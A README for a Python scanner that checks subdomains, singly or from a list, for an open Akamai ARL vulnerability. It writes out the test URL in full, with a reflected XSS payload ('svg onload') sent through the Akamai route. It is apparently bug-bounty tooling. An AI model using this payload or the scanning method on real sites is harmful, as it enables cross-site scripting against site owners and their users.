
# Akamai ARL Hack

- This research was stolen from todayisnew a.k.a @codecancare by a bug bounty triager.

It is now public knowledge, but we are sorry for what happened to todayisnew.


This is a script to test an open Akamai ARL vulnerability.

When successful, you can more or less load arbitrary Akamai-hosted content from the target subdomain.

## Usage

```
python arl.py <subdomain>

python arl.py list_of_subdomains.txt
```

Where the latter is a text file of line-delimited targets.

## What it tries to do

```
1. GET request to subdomain.example.org
2. If response doesn't suggest naked Akamai showing, exits
3. http://subdomain.example.org/7/100/33/1d/www.citysearch.com/search?what=reallylongstringtomakethepayloadforxssmoveoutofview&where=place%22%3E%3Csvg+onload=confirm(document.location)%3E
4. Prints 'true' or 'false' whether that payload seemed to work
```


